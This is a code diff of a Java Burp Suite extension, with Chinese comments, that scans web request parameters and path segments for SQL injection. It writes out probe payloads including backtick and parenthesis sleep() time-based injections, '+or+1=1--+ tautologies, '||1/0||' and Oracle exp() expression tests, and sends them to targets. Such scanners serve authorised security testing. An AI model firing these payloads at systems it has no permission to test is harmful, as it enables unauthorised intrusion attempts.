+                                    String poc4Body = poc4Resp.bodyToString();
+                                    double simBasePoc4 = jaccardSimilarity(baseBody, poc4Body);
+                                    double simPoc1Poc4 = jaccardSimilarity(poc1Body, poc4Body);
+                                    boolean poc4Hit = simBasePoc4 > 0.90 && simPoc1Poc4 < 0.90;
+                                    appendLog(String.format("  逗号测试 [%s] poc4=value,2 sim(base,poc4)=%.4f sim(poc1,poc4)=%.4f result=%s",
+                                            key, simBasePoc4, simPoc1Poc4, poc4Hit));
+                                    if (poc4Hit) {
+                                        poc3OrPoc4Hit = true;
+                                    }
                                 }
-                                appendLog(String.format("  模糊查询测试 [%s] sim(poc2,poc3)=%.4f sim(poc3,poc4)=%.4f result=%s",
-                                        key, simPoc2Poc3, simPoc3Poc4, fuzzyVuln));
                             }
+
+                            commaVuln = poc3OrPoc4Hit;
                         }
                     }
                 }
+            }
+            if (commaVuln) {
+                stopAfterCurrentRule = true;
+            }
+
+            boolean expVuln = false;
+            boolean divVuln = false;
+            boolean sleepVuln = false;
+            boolean backtickVuln = false;
+            boolean fuzzyVuln = false;
+
+            // 反引号注入检测：
+            // poc1: value`                    -> 与原始响应体长度差 > 10
+            // poc2: value`and+sleep(2)--+     -> 与原始响应时间差 > 2s 且 < 4s
+            // poc3: value`and+sleep(5)--+     -> 与原始响应时间差 > 4s 且 < 6s (命中)
+            if (!stopAfterCurrentRule) {
+                int baseLen = baseRespLen;
+                long baseCostMs = (quickBaselineCost == Long.MAX_VALUE) ? 0 : quickBaselineCost;
+
+                String poc1Value = value + "`";
+                HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
+                long t1 = System.currentTimeMillis();
+                HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
+                long cost1 = System.currentTimeMillis() - t1;
+                sentRequests++;
+                if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                HttpResponse poc1Resp = poc1Result.response();
+                boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
+                if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;
+
+                int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
+                HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
+                LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
+                        poc1Req.url().toString(),
+                        key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
+                paramEntries.add(poc1Entry);
+                backtickEntries.add(poc1Entry);
+
+                int poc1Len = poc1Ok ? poc1Resp.body().length() : 0;
+                int lenDiff = Math.abs(poc1Len - baseLen);
+                boolean poc1Hit = poc1Ok && lenDiff > 10;
+                appendLog(String.format("  反引号测试 [%s] poc1=value` len(base=%d, poc1=%d, diff=%d) result=%s",
+                        key, baseLen, poc1Len, lenDiff, poc1Hit));
+
+                if (poc1Hit) {
+                    String poc2Value = value + "`and+sleep(2)--+";
+                    HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
+                    long t2 = System.currentTimeMillis();
+                    HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
+                    long cost2 = System.currentTimeMillis() - t2;
+                    sentRequests++;
+                    if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                    HttpResponse poc2Resp = poc2Result.response();
+                    boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);
+
+                    int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
+                    HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
+                    LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
+                            poc2Req.url().toString(),
+                            key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
+                    paramEntries.add(poc2Entry);
+                    backtickEntries.add(poc2Entry);
+
+                    long diff2 = cost2 - baseCostMs;
+                    boolean poc2Hit = poc2Ok && diff2 > 2000 && diff2 < 4000;
+                    appendLog(String.format("  反引号测试 [%s] poc2=value`and+sleep(2)--+ cost(base=%dms, poc2=%dms, diff=%dms) result=%s",
+                            key, baseCostMs, cost2, diff2, poc2Hit));
+
+                    if (poc2Hit) {
+                        String poc3Value = value + "`and+sleep(5)--+";
+                        HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
+                        long t3 = System.currentTimeMillis();
+                        HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
+                        long cost3 = System.currentTimeMillis() - t3;
+                        sentRequests++;
+                        if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                        HttpResponse poc3Resp = poc3Result.response();
+                        boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);
+
+                        int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
+                        HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
+                        LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
+                                poc3Req.url().toString(),
+                                key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
+                        paramEntries.add(poc3Entry);
+                        backtickEntries.add(poc3Entry);
+
+                        long diff3 = cost3 - baseCostMs;
+                        backtickVuln = poc3Ok && diff3 > 4000 && diff3 < 6000;
+                        appendLog(String.format("  反引号测试 [%s] poc3=value`and+sleep(5)--+ cost(base=%dms, poc3=%dms, diff=%dms) result=%s",
+                                key, baseCostMs, cost3, diff3, backtickVuln));
+                    }
+                }
+            }
+            if (backtickVuln) {
+                stopAfterCurrentRule = true;
+            }
+
+            // 模糊查询注入检测：
+            // poc1: value'                  -> 与原始响应长度差异 > 10
+            // poc2: value'+or+1=1--+        -> 与原始响应相似度 > 0.90
+            // poc3: value'+or+1=2--+
+            // poc4: value'+or+1=3--+        -> sim(poc2,poc3) < 0.90 且 sim(poc3,poc4) > 0.90
+            if (!stopAfterCurrentRule) {
+                String baseBody = resp.bodyToString();
+                int baseLen = baseRespLen;
+
+                String poc1Value = value + "'";
+                HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
+                long t1 = System.currentTimeMillis();
+                HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
+                long cost1 = System.currentTimeMillis() - t1;
+                sentRequests++;
+                if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                HttpResponse poc1Resp = poc1Result.response();
+                boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
+                if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;
+
+                int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
+                HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
+                LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
+                        poc1Req.url().toString(),
+                        key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
+                paramEntries.add(poc1Entry);
+                fuzzyEntries.add(poc1Entry);
+
+                int poc1Len = poc1Ok ? poc1Resp.body().length() : 0;
+                int lenDiff = Math.abs(poc1Len - baseLen);
+                boolean poc1Hit = poc1Ok && lenDiff > 10;
+                appendLog(String.format("  模糊查询测试 [%s] poc1=value' len(base=%d, poc1=%d, diff=%d) result=%s",
+                        key, baseLen, poc1Len, lenDiff, poc1Hit));
+
+                if (poc1Hit) {
+                    String poc2Value = value + "'+or+1=1--+";
+                    HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
+                    long t2 = System.currentTimeMillis();
+                    HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
+                    long cost2 = System.currentTimeMillis() - t2;
+                    sentRequests++;
+                    if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                    HttpResponse poc2Resp = poc2Result.response();
+                    boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);
+                    if (poc2Ok && cost2 < quickBaselineCost) quickBaselineCost = cost2;
+
+                    int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
+                    HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
+                    LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
+                            poc2Req.url().toString(),
+                            key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
+                    paramEntries.add(poc2Entry);
+                    fuzzyEntries.add(poc2Entry);
+
+                    {
+                        String poc3Value = value + "'+or+1=2--+";
+                        HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
+                        long t3 = System.currentTimeMillis();
+                        HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
+                        long cost3 = System.currentTimeMillis() - t3;
+                        sentRequests++;
+                        if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                        HttpResponse poc3Resp = poc3Result.response();
+                        boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);
+                        if (poc3Ok && cost3 < quickBaselineCost) quickBaselineCost = cost3;
+
+                        int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
+                        HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
+                        LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
+                                poc3Req.url().toString(),
+                                key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
+                        paramEntries.add(poc3Entry);
+                        fuzzyEntries.add(poc3Entry);
+
+                        {
+                            String poc4Value = value + "'+or+1=3--+";
+                            HttpRequest poc4Req = buildMutatedRequest(req, target, poc4Value);
+                            long t4 = System.currentTimeMillis();
+                            HttpRequestResponse poc4Result = sendRequestWithInterval(poc4Req);
+                            long cost4 = System.currentTimeMillis() - t4;
+                            sentRequests++;
+                            if (cost4 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                            HttpResponse poc4Resp = poc4Result.response();
+                            boolean poc4Ok = (poc4Resp != null && poc4Resp.statusCode() >= 200 && poc4Resp.statusCode() < 300);
+                            if (poc4Ok && cost4 < quickBaselineCost) quickBaselineCost = cost4;
+
+                            int code4 = poc4Ok ? poc4Resp.statusCode() : 0;
+                            HttpRequestResponse poc4Display = buildDisplayMessage(poc4Req, poc4Result);
+                            LogEntry poc4Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc4Display,
+                                    poc4Req.url().toString(),
+                                    key, poc4Value, "", requestMd5, (int) cost4, "end", code4, false));
+                            paramEntries.add(poc4Entry);
+                            fuzzyEntries.add(poc4Entry);
+
+                            double simPoc2Poc3 = 1.0;
+                            double simPoc3Poc4 = 0.0;
+                            if (poc2Ok && poc3Ok && poc4Ok) {
+                                simPoc2Poc3 = textSimilarity(poc2Resp.bodyToString(), poc3Resp.bodyToString());
+                                simPoc3Poc4 = textSimilarity(poc3Resp.bodyToString(), poc4Resp.bodyToString());
+                                fuzzyVuln = simPoc2Poc3 < 0.90 && simPoc3Poc4 > 0.90;
+                            }
+                            appendLog(String.format("  模糊查询测试 [%s] sim(poc2,poc3)=%.4f sim(poc3,poc4)=%.4f result=%s",
+                                    key, simPoc2Poc3, simPoc3Poc4, fuzzyVuln));
+                        }
+                    }
+                }
+            }
+            if (fuzzyVuln) {
+                stopAfterCurrentRule = true;
             }
 
             // 报错注入检测（对四个 payload 的响应逐一检测）
             boolean errorVuln = false;
             String  errorSign = "";
-            if (!compiledErrorPatterns.isEmpty()) {
+            if (!stopAfterCurrentRule && !compiledErrorPatterns.isEmpty()) {
                 outer:
                 for (int qi = 0; qi < 4; qi++) {
                     if (quoteResults[qi] == null) continue;
@@ -1120,20 +1121,51 @@ public class BurpExtender implements BurpExtension {
                     }
                 }
             }
+            if (errorVuln) {
+                stopAfterCurrentRule = true;
+            }
 
-            // 分级检测：快速规则命中后，跳过重型规则(exp/div/sleep)
-            boolean fastRuleHit = quoteVuln || numVuln || commaVuln || fuzzyVuln || backtickVuln || errorVuln;
-            if (!fastRuleHit && !slowDetected && sentRequests < MAX_REQUESTS_PER_PARAM) {
+            // 规则命中后停止后续检测，但保留 div 检测
+            {
+                String[] divPayloads = {"'||1/0||'", "'||1/1||'"};
+                int[] divLens = new int[2];
+                for (int di = 0; di < 2; di++) {
+                    String payloadValue = value + divPayloads[di];
+                    HttpRequest divReq = buildMutatedRequest(req, target, payloadValue);
+                    long t1 = System.currentTimeMillis();
+                    HttpRequestResponse divResult = sendRequestWithInterval(divReq);
+                    long cost = System.currentTimeMillis() - t1;
+                    sentRequests++;
+                    if (cost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
+                    HttpResponse divResp = divResult.response();
+                    boolean divOk = (divResp != null && divResp.statusCode() >= 200 && divResp.statusCode() < 300);
+                    if (divOk && cost < quickBaselineCost) quickBaselineCost = cost;
+                    divLens[di] = divOk ? divResp.body().length() : 0;
+                    int code = divOk ? divResp.statusCode() : 0;
+                    HttpRequestResponse divDisplay = buildDisplayMessage(divReq, divResult);
+                    LogEntry detail = addDetailEntry(new LogEntry(count.get(), toolFlag, divDisplay,
+                            divReq.url().toString(),
+                            key, payloadValue, "", requestMd5, (int) cost, "end", code, false));
+                    paramEntries.add(detail);
+                    divEntries.add(detail);
+                }
+                boolean dCond1 = Math.abs(divLens[1] - baseRespLen) <= 10;
+                boolean dCond2 = Math.abs(divLens[1] - divLens[0]) >= 10;
+                divVuln = dCond1 && dCond2;
+                appendLog(String.format("  除零测试 [%s] len(base=%d, 1/0=%d, 1/1=%d)",
+                        key, baseRespLen, divLens[0], divLens[1]));
+                if (divVuln) {
+                    stopAfterCurrentRule = true;
+                }
+            }
+
+            if (!stopAfterCurrentRule && !slowDetected) {
                 // Oracle exp 检测：'||exp(200)||' / '||exp(11111)||' / '||exp(2222)||'
                 String[] expPayloads = {"'||exp(200)||'", "'||exp(11111)||'", "'||exp(2222)||'"};
                 int[] expLens = new int[3];
                 HttpResponse[] expResponses = new HttpResponse[3];
                 boolean[] expOkFlags = new boolean[3];
                 for (int ei = 0; ei < 3; ei++) {
-                    if (sentRequests >= MAX_REQUESTS_PER_PARAM) {
-                        appendLog(scanId + " 参数=" + key + " 达到最大测试请求数，停止exp payload");
-                        break;
-                    }
                     String payloadValue = value + expPayloads[ei];
                     HttpRequest expReq = buildMutatedRequest(req, target, payloadValue);
                     long t1 = System.currentTimeMillis();
@@ -1166,43 +1198,16 @@ public class BurpExtender implements BurpExtension {
                 expVuln = eCond1 && eCond2 && eCond3;
                 appendLog(String.format("  exp测试 [%s] len(base=%d, exp200=%d, exp11111=%d, exp2222=%d) sim(exp2222,exp11111)=%.4f",
                         key, baseRespLen, expLens[0], expLens[1], expLens[2], simExp2222Exp11111));
-
-                // 除零检测：'||1/0||' / '||1/1||'
-                String[] divPayloads = {"'||1/0||'", "'||1/1||'"};
-                int[] divLens = new int[2];
-                for (int di = 0; di < 2; di++) {
-                    if (sentRequests >= MAX_REQUESTS_PER_PARAM) {
-                        appendLog(scanId + " 参数=" + key + " 达到最大测试请求数，停止除零payload");
-                        break;
-                    }
-                    String payloadValue = value + divPayloads[di];
-                    HttpRequest divReq = buildMutatedRequest(req, target, payloadValue);
-                    long t1 = System.currentTimeMillis();
-                    HttpRequestResponse divResult = sendRequestWithInterval(divReq);
-                    long cost = System.currentTimeMillis() - t1;
-                    sentRequests++;
-                    if (cost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
-                    HttpResponse divResp = divResult.response();
-                    boolean divOk = (divResp != null && divResp.statusCode() >= 200 && divResp.statusCode() < 300);
-                    if (divOk && cost < quickBaselineCost) quickBaselineCost = cost;
-                    divLens[di] = divOk ? divResp.body().length() : 0;
-                    int code = divOk ? divResp.statusCode() : 0;
-                    HttpRequestResponse divDisplay = buildDisplayMessage(divReq, divResult);
-                    LogEntry detail = addDetailEntry(new LogEntry(count.get(), toolFlag, divDisplay,
-                            divReq.url().toString(),
-                            key, payloadValue, "", requestMd5, (int) cost, "end", code, false));
-                    paramEntries.add(detail);
-                    divEntries.add(detail);
+                if (expVuln) {
+                    stopAfterCurrentRule = true;
                 }
-                boolean dCond1 = Math.abs(divLens[1] - baseRespLen) <= 10;
-                boolean dCond2 = Math.abs(divLens[1] - divLens[0]) >= 10;
-                divVuln = dCond1 && dCond2;
-                appendLog(String.format("  除零测试 [%s] len(base=%d, 1/0=%d, 1/1=%d)",
-                        key, baseRespLen, divLens[0], divLens[1]));
 
-                // 延时注入检测：) and sleep(5) and (1=1
-                if (sentRequests < MAX_REQUESTS_PER_PARAM) {
-                    String sleepPayload = ") and sleep(5) and (1=1";
+                // 括号模糊查询延时注入：
+                // 1. value' 与 value'' 响应体长度差 <= 5
+                // 2. value')+and+sleep(5)--+ 与原始请求时间差 >= 5000ms
+                if (!stopAfterCurrentRule) {
+                    boolean quoteLenClose = Math.abs(len1 - len2) <= 5;
+                    String sleepPayload = "')+and+sleep(5)--+";
                     String payloadValue = value + sleepPayload;
                     HttpRequest sleepReq = buildMutatedRequest(req, target, payloadValue);
                     long t1 = System.currentTimeMillis();
@@ -1219,23 +1224,21 @@ public class BurpExtender implements BurpExtension {
                             key, payloadValue, "", requestMd5, (int) cost, "end", code, false));
                     paramEntries.add(detail);
                     sleepEntries.add(detail);
-                    sleepVuln = cost > 5000 && quickBaselineCost < 2000;
-                    appendLog(String.format("  延时测试 [%s] cost(base=%dms, sleep=%dms)",
-                            key, quickBaselineCost == Long.MAX_VALUE ? -1 : quickBaselineCost, cost));
+                    long baseCostMs = (quickBaselineCost == Long.MAX_VALUE) ? 0 : quickBaselineCost;
+                    long diffMs = cost - baseCostMs;
+                    sleepVuln = quoteLenClose && diffMs >= 5000;
+                    appendLog(String.format("  括号延时测试 [%s] len(value'=%d, value''=%d, diff=%d) cost(base=%dms, sleep=%dms, diff=%dms) result=%s",
+                            key, len1, len2, Math.abs(len1 - len2), baseCostMs, cost, diffMs, sleepVuln));
                 }
             } else {
-                appendLog(scanId + " 参数=" + key + " 快速规则命中或请求偏慢，跳过 exp/div/sleep 检测");
+                appendLog(scanId + " 参数=" + key + " 已命中规则或请求偏慢，跳过 exp/sleep 检测");
             }
 
             // 自定义 payload 检测（附加 payload，独立发送）
             boolean diyVuln = false;
             String  diySign = "";
-            if (jTextAreaInt == 1) {
+            if (!stopAfterCurrentRule && jTextAreaInt == 1) {
                 for (String payload : jTextAreaData1.split("\n")) {
-                    if (sentRequests >= MAX_REQUESTS_PER_PARAM) {
-                        appendLog(scanId + " 参数=" + key + " 达到最大测试请求数，停止diy payload");
-                        break;
-                    }
                     if (slowDetected) {
                         appendLog(scanId + " 参数=" + key + " 请求偏慢，跳过剩余diy payload");
                         break;
@@ -1286,6 +1289,9 @@ public class BurpExtender implements BurpExtension {
                     paramEntries.add(detail);
                     diyEntries.add(detail);
                 }
+                if (diyVuln) {
+                    stopAfterCurrentRule = true;
+                }
             }
 
             // ── 汇总当前参数结论 ────────────────────────────
@@ -1321,8 +1327,8 @@ public class BurpExtender implements BurpExtension {
                 appendLog("【表达式注入】参数:" + key + " 触发 1/0 与 1/1 规则");
             }
             if (sleepVuln) {
-                triggeredSigns.add("✔ 延时注入(sleep)");
-                appendLog("【延时注入】参数:" + key + " 触发 sleep(5) 规则");
+                triggeredSigns.add("✔ 括号模糊查询延时注入");
+                appendLog("【括号模糊查询延时注入】参数:" + key + " 触发 value' / value'' + sleep(5) 规则");
             }
             if (errorVuln) triggeredSigns.add(errorSign);
             if (diyVuln)   triggeredSigns.add(diySign);
@@ -1343,7 +1349,7 @@ public class BurpExtender implements BurpExtension {
                 if (backtickVuln) markEntries(backtickEntries, "✔ 反引号注入");
                 if (expVuln) markEntries(expEntries, "✔ 表达式注入(exp)");
                 if (divVuln) markEntries(divEntries, "✔ 表达式注入(除零)");
-                if (sleepVuln) markEntries(sleepEntries, "✔ 延时注入(sleep)");
+                if (sleepVuln) markEntries(sleepEntries, "✔ 括号模糊查询延时注入");
                 if (errorVuln) markEntries(quoteEntries, errorSign);
                 if (diyVuln) markEntries(diyEntries, diySign);
 
@@ -1495,7 +1501,11 @@ public class BurpExtender implements BurpExtension {
     }
 
     private HttpRequestResponse buildDisplayMessage(HttpRequest sentRequest, HttpRequestResponse actualResult) {
-        return HttpRequestResponse.httpRequestResponse(sentRequest, actualResult.response());
+        HttpRequest displayRequest = sentRequest;
+        if (actualResult != null && actualResult.request() != null) {
+            displayRequest = actualResult.request();
+        }
+        return HttpRequestResponse.httpRequestResponse(displayRequest, actualResult.response());
     }
 
     private String extractHost(String url) {
@@ -1666,7 +1676,7 @@ public class BurpExtender implements BurpExtension {
                 if (parts[i] == null || parts[i].isEmpty()) continue;
                 current++;
                 if (current == pathIndex) {
-                    parts[i] = newValue;
+                    parts[i] = urlEncodePathSegment(newValue);
                     break;
                 }
             }
@@ -1687,7 +1697,7 @@ public class BurpExtender implements BurpExtension {
                 newUrl.append('#').append(uri.getRawFragment());
             }
 
-            HttpRequest updated = applyRequestUrl(req, newUrl.toString());
+            HttpRequest updated = applyRequestPath(req, newUrl.toString());
             if (updated == req) {
                 appendLog("Path改写失败，跳过该payload: " + newUrl);
                 return req;
@@ -1705,12 +1715,6 @@ public class BurpExtender implements BurpExtension {
         updated = tryInvokeRequestMethod(req, "withUpdatedUrl", newUrl);
         if (isUrlChanged(req, updated)) return updated;
 
-        updated = tryInvokeRequestMethod(req, "withPath", extractRawPath(newUrl));
-        if (isUrlChanged(req, updated)) return updated;
-
-        updated = tryInvokeRequestMethod(req, "withUpdatedPath", extractRawPath(newUrl));
-        if (isUrlChanged(req, updated)) return updated;
-
         try {
             URI targetUri = new URI(newUrl);
             updated = tryInvokeRequestMethod(req, "withUrl", targetUri);
@@ -1719,6 +1723,19 @@ public class BurpExtender implements BurpExtension {
             updated = tryInvokeRequestMethod(req, "withUpdatedUrl", targetUri);
             if (isUrlChanged(req, updated)) return updated;
         } catch (URISyntaxException ignored) {}
+
+        return req;
+    }
+
+    private HttpRequest applyRequestPath(HttpRequest req, String newUrl) {
+        HttpRequest updated = applyRequestUrl(req, newUrl);
+        if (isUrlChanged(req, updated)) return updated;
+
+        updated = tryInvokeRequestMethod(req, "withPath", extractRawPath(newUrl));
+        if (isUrlChanged(req, updated)) return updated;
+
+        updated = tryInvokeRequestMethod(req, "withUpdatedPath", extractRawPath(newUrl));
+        if (isUrlChanged(req, updated)) return updated;
 
         return req;
     }
@@ -1744,6 +1761,14 @@ public class BurpExtender implements BurpExtension {
     }
 
     private String urlEncodeQueryValue(String value) {
+        try {
+            return URLEncoder.encode(value, StandardCharsets.UTF_8).replace("+", "%20");
+        } catch (Exception ignored) {
+            return value;
+        }
+    }
+
+    private String urlEncodePathSegment(String value) {
         try {
             return URLEncoder.encode(value, StandardCharsets.UTF_8).replace("+", "%20");
         } catch (Exception ignored) {
@@ -1801,6 +1826,14 @@ public class BurpExtender implements BurpExtension {
                 if (trimmed.contains(".")) {
                     pathIndex++;
                     continue;
+                }
+                String dedupKey = urlDecode(trimmed).trim().toLowerCase();
+                synchronized (scannedPathValues) {
+                    if (scannedPathValues.contains(dedupKey)) {
+                        pathIndex++;
+                        continue;
+                    }
+                    scannedPathValues.add(dedupKey);
                 }
                 targets.add(ScanTarget.pathTarget("path[" + pathIndex + "]", trimmed, pathIndex));
                 pathIndex++;
